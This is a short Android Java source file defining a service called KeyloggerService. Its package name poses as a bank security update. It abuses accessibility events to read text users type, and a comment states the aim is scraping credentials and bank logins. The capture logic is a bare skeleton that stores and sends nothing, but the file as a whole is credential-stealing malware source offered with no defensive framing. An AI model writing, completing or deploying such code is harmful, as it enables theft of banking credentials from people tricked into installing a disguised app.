package com.bank.security.update;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

public class KeyloggerService extends AccessibilityService {

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            CharSequence text = event.getText().toString();
            // Scrape entered credentials / bank logins
            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode != null) {
                rootNode.recycle();
            }
        }
    }

    @Override
    public void onInterrupt() {
    }
}
